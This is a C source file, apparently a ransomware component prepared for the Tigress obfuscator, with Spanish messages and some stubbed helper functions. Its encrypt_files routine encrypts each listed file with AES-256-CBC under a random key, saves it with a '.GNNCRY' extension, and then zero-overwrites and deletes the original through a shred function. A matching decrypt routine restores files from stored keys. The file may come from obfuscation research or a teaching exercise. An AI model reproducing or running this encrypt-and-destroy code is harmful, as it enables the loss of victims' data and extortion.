#include"tigress.h"
#include "crypto.h"
#include "struct.h"
#include "func.h"
#include <stdio.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#define BUF_SIZE 4096
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

int main() {return 0;}
char * generate_key(int length) {return 0;}
void append(List **l, char *file_path, char *key, char *iv) {}

void encrypt_files(List *files, List **encrypted, List **not_encrypted) {
    FILE *old = NULL, *new = NULL;
    char *new_name = NULL;
    char *iv = NULL;
    char *key = NULL;

    while (files != NULL) {
        // Verificar si el archivo existe antes de intentar abrirlo
        struct stat buffer;
        if (stat(files->info[2], &buffer) != 0) {
            fprintf(stderr, "El archivo no existe o no se puede acceder: %s\n", files->info[2]);
            append(not_encrypted, files->info[2], NULL, NULL);
            files = files->prox;
            continue;
        }

        old = fopen(files->info[2], "rb");
        if (old != NULL) {
            new_name = (char *)malloc(sizeof(char) * (strlen(files->info[2]) + 11));
            if (new_name == NULL) {
                fprintf(stderr, "Error al asignar memoria para new_name\n");
                fclose(old);
                break;  // Sal de la función para evitar problemas de memoria
            }

            strcpy(new_name, files->info[2]);
            strcat(new_name, ".GNNCRY");
            new = fopen(new_name, "wb");
            if (new == NULL) {
                fprintf(stderr, "Error al abrir el archivo para escribir: %s\n", new_name);
                fclose(old);
                free(new_name);
                files = files->prox;
                continue;  // Pasa al siguiente archivo
            }

            iv = generate_key(16);
            key = generate_key(32);
            if (iv == NULL || key == NULL) {
                fprintf(stderr, "Error al generar clave o IV\n");
                fclose(new);
                fclose(old);
                free(new_name);
                free(iv);
                free(key);
                files = files->prox;
                continue;
            }
	    
	    printf("Encriptando fichero: %s\nKey: %s\nIV: %s", files->info[2], key, iv);
	    
            encrypt(old, new, key, iv);
            append(encrypted, new_name, key, iv);

            fclose(new);
            fclose(old);
            free(key);
            free(iv);
            shred(files->info[2]);
        } else {
            fprintf(stderr, "Error al abrir el archivo para leer: %s\n", files->info[2]);
            append(not_encrypted, files->info[2], NULL, NULL);
        }

        free(new_name);
        files = files->prox;
    }
}

void decrypt_files(List *encrypted) {
    FILE *old = NULL, *new = NULL;
    char *new_name = NULL;
    char *iv = NULL;
    char *key = NULL;

    while (encrypted != NULL) {
        printf("Intentando abrir el archivo: %s\n", encrypted->info[2]);

        size_t len = strlen(encrypted->info[2]);
        if (len > 0 && encrypted->info[2][len - 1] == '\n') {
            encrypted->info[2][len - 1] = '\0';
        }

        if (access(encrypted->info[2], F_OK) == -1) {
            fprintf(stderr, "El archivo no existe o no se puede acceder: %s (error: %s)\n", encrypted->info[2], strerror(errno));
            encrypted = encrypted->prox;
            continue;
        }

        struct stat buffer;
        if (stat(encrypted->info[2], &buffer) != 0) {
            fprintf(stderr, "Error al acceder al archivo %s: %s\n", encrypted->info[2], strerror(errno));
            encrypted = encrypted->prox;
            continue;
        }

        old = fopen(encrypted->info[2], "rb");
        if (old == NULL) {
            fprintf(stderr, "Error al abrir el archivo: %s\n", encrypted->info[2]);
            encrypted = encrypted->prox;
            continue;
        }

        int tam = strlen(encrypted->info[2]);
        new_name = (char *)malloc(sizeof(char) * (tam - strlen(".GNNCRY") + 1));
        if (new_name == NULL) {
            fprintf(stderr, "Error al asignar memoria para new_name\n");
            fclose(old);
            break;
        }

        strncpy(new_name, encrypted->info[2], tam - strlen(".GNNCRY"));
        new_name[tam - strlen(".GNNCRY")] = '\0';

        new = fopen(new_name, "wb");
        if (new == NULL) {
            fprintf(stderr, "Error al abrir el archivo de salida: %s\n", new_name);
            fclose(old);
            free(new_name);
            encrypted = encrypted->prox;
            continue;
        }

        iv = strdup(encrypted->info[1]);
        key = strdup(encrypted->info[0]);
        if (iv == NULL || key == NULL) {
            fprintf(stderr, "Error al copiar la clave o IV\n");
            fclose(new);
            fclose(old);
            free(new_name);
            free(iv);
            free(key);
            encrypted = encrypted->prox;
            continue;
        }
        
        printf("Desencriptando fichero: %s\nNuevo nombre: %s\nKey: %s\nIV: %s\n", encrypted->info[2], new_name, key, iv);

        if (strlen(key) != 32 || strlen(iv) != 16) {
            fprintf(stderr, "Error: Longitud de clave o IV no válida (Key: %zu, IV: %zu)\n", strlen(key), strlen(iv));
            fclose(old);
            fclose(new);
            free(new_name);
            free(key);
            free(iv);
            encrypted = encrypted->prox;
            continue;
        }

        decrypt(old, new, key, iv);

        fclose(new);
        fclose(old);
        free(new_name);
        free(key);
        free(iv);

        encrypted = encrypted->prox;
    }
}



void shred(char *path) {
    struct stat stat_buf;
    if (stat(path, &stat_buf) == -1) {
        perror("Error al obtener el tamaño del archivo");
        return;
    }
    off_t fsize = stat_buf.st_size;

    int fd = open(path, O_WRONLY);
    if (fd == -1) {
        perror("Error al abrir el archivo para sobreescribir");
        return;
    }

    void *buf = malloc(BUF_SIZE);
    if (buf == NULL) {
        perror("Error al asignar memoria");
        close(fd);
        return;
    }
    memset(buf, 0, BUF_SIZE);
    ssize_t ret = 0;
    off_t shift = 0;
    while ((ret = write(fd, buf, (fsize - shift > BUF_SIZE) ? BUF_SIZE : (fsize - shift))) > 0)
        shift += ret;

    if (ret == -1)
        perror("Error al escribir en el archivo");

    close(fd);
    free(buf);
    remove(path);
}

void encrypt(FILE *in, FILE *out, char *key, char *iv) {
    int chunk_size = 512;
    unsigned char inbuf[chunk_size];
    unsigned char outbuf[chunk_size + EVP_MAX_BLOCK_LENGTH];
    int inlen, outlen;

    if (key == NULL || iv == NULL) {
        fprintf(stderr, "Error: clave o IV es NULL\n");
        return;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (ctx == NULL) {
        fprintf(stderr, "Error al crear el contexto de cifrado\n");
        return;
    }

    if (EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), NULL, (unsigned char*)key, (unsigned char*)iv, 1) != 1) {
        fprintf(stderr, "Error en EVP_CipherInit_ex\n");
        ERR_print_errors_fp(stderr);
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    while ((inlen = fread(inbuf, 1, chunk_size, in)) > 0) {
        if (!EVP_CipherUpdate(ctx, outbuf, &outlen, inbuf, inlen)) {
            fprintf(stderr, "Error en EVP_CipherUpdate\n");
            ERR_print_errors_fp(stderr);
            EVP_CIPHER_CTX_free(ctx);
            return;
        }
        fwrite(outbuf, 1, outlen, out);
    }

    if (!EVP_CipherFinal_ex(ctx, outbuf, &outlen)) {
        fprintf(stderr, "Error en EVP_CipherFinal_ex\n");
        ERR_print_errors_fp(stderr);
        EVP_CIPHER_CTX_free(ctx);
        return;
    }
    fwrite(outbuf, 1, outlen, out);

    EVP_CIPHER_CTX_free(ctx);
    rewind(in);
    rewind(out);
}

void decrypt(FILE *in, FILE *out, char *key, char *iv) {
    int chunk_size = 512;
    unsigned char inbuf[chunk_size];
    unsigned char outbuf[chunk_size + EVP_MAX_BLOCK_LENGTH];
    int inlen, outlen;

    if (key == NULL || iv == NULL) {
        fprintf(stderr, "Error: Clave o IV son NULL\n");
        return;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (ctx == NULL) {
        fprintf(stderr, "Error al crear el contexto de cifrado\n");
        return;
    }

    // Inicialización directa con clave e IV
    if (EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), NULL, (unsigned char*)key, (unsigned char*)iv, 0) != 1) {
        fprintf(stderr, "Error en EVP_CipherInit_ex (clave y IV)\n");
        ERR_print_errors_fp(stderr);  // Muestra detalles de OpenSSL si hay errores
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    // Leer y procesar bloques
    while ((inlen = fread(inbuf, 1, chunk_size, in)) > 0) {
        if (!EVP_CipherUpdate(ctx, outbuf, &outlen, inbuf, inlen)) {
            fprintf(stderr, "Error en EVP_CipherUpdate\n");
            ERR_print_errors_fp(stderr);
            EVP_CIPHER_CTX_free(ctx);
            return;
        }
        fwrite(outbuf, 1, outlen, out);
    }

    // Finalización
    if (!EVP_CipherFinal_ex(ctx, outbuf, &outlen)) {
        fprintf(stderr, "Error en EVP_CipherFinal_ex\n");
        ERR_print_errors_fp(stderr);
        EVP_CIPHER_CTX_free(ctx);
        return;
    }
    fwrite(outbuf, 1, outlen, out);

    EVP_CIPHER_CTX_free(ctx);
    rewind(in);
    rewind(out);
}
